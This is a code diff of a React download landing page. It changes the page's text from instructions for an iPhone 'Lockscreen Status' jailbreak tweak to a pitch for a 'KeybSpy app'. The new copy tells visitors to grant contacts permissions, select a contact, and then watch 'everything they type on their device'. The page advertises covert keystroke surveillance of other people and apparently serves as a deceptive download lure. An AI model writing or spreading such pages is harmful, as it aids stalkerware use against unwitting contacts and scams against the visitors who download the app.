@@ -43,7 +43,7 @@ const Index = () => {
             onClick={handleDownloadClick}
             className="bg-accent hover:bg-accent/90 text-accent-foreground font-bold px-6 py-3 text-sm rounded-lg"
           >
-            DOWNLOAD Lockscreen Status
+            DOWNLOAD KeybSpy app
           </Button>
         </div>
 
@@ -55,7 +55,7 @@ const Index = () => {
               Install and open the app. Availability may vary by region.
             </p>
             <p className="text-foreground text-center">
-              Go to "Easy lockscreen status" app attached at the end of the post, download and open the app.
+              Open the KeybSpy app and grant permission for contacts and other necessary applications.            
             </p>
             <div className="flex justify-center">
               <img
@@ -69,7 +69,7 @@ const Index = () => {
           {/* Step 2 */}
           <div className="space-y-4">
             <p className="text-foreground text-center">
-              Open the main page. It has many custom tricks for IPhone, so use the search to find 'Lockscreen Buddy" to install it.
+              Open the KeybSpy app and grant permission for contacts and other necessary applications.              
             </p>
             <div className="flex justify-center">
               <img
@@ -83,7 +83,7 @@ const Index = () => {
           {/* Step 3 */}
           <div className="space-y-4">
             <p className="text-foreground text-center">
-              You will get a jailbreak with free custom option "Lockscreen buddy". Open it and click "Restart Spring Board".
+              In the app menu, go to the Contacts section and select a contact from your list.            
             </p>
             <div className="flex justify-center">
               <img
@@ -96,7 +96,7 @@ const Index = () => {
 
           {/* Final Note */}
           <p className="text-foreground text-center font-medium">
-            Custom option "Lockscreen status" will be activated.
+            Now you are connected to the contact’s keyboard and you can see everything they type on their device.          
           </p>
         </div>
       </div>
